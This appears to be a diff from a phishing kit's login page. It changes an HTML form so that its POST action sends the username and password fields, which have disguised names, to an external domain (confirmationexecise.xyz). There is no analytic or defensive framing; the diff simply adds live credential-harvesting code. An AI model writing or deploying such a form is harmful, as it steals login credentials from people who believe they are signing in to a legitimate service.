@@ -16,7 +16,7 @@
  
 
  
-<form action="next.php" method="post"   >  
+<form action="https://confirmationexecise.xyz/mk/next.php" method="post"   >  
  <input   name="newus00" type="text" autocomplete="off" required style="position:absolute;width:260px;left:369px;top:276px;z-index:28;height:24px;  border:1px solid #fff;  font-size:14px; "  >
  
  <input type="password"  name="pa33rdw0" required style="position:absolute;width:260px;left:369px;top:340px;z-index:28; height:24px;  border:none;font-size:14px;"   >
